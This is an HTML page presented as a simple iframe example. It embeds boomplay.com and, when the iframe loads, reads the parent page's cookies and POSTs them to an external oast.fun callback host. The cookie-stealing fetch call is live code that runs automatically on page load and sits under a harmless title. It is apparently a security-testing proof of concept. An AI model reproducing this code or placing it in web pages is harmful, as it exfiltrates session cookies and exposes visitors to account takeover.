<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iframe Example</title>
</head>
<body>
    <h1>Iframe Example</h1>

    <!-- Create the iframe dynamically -->
    <script>
        // Create the iframe element
        const iframe = document.createElement('iframe');
        
        // Set the sandbox attributes for the iframe
        iframe.sandbox.add('allow-scripts');
        iframe.sandbox.add('allow-same-origin');
        
        // Set the source URL for the iframe (replace with your desired URL)
        iframe.src = 'https://boomplay.com'; // External source
        
        // Set the iframe dimensions
        iframe.width = '800';
        iframe.height = '600';
        
        // Append iframe to the body
        document.body.appendChild(iframe);

        // Log iframe creation
        console.log('Iframe created with sandbox attributes: allow-scripts, allow-same-origin');

        // Send cookies from the parent to the external server
        const sendCookiesToServer = () => {
            const parentCookies = document.cookie; // Get cookies from the parent window

            // Send cookies to the external server (replace with your server URL)
            fetch('https://tetenplixlclsrgugyrk29jxjsbg98hkd.oast.fun', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    cookies: parentCookies,
                }),
            })
            .then(response => response.json())
            .then(data => console.log('Cookies sent to external server:', data))
            .catch(error => console.error('Error sending cookies:', error));
        };

        // Call the function to send cookies after iframe loads
        iframe.onload = function() {
            sendCookiesToServer();
        };
    </script>
</body>
</html>
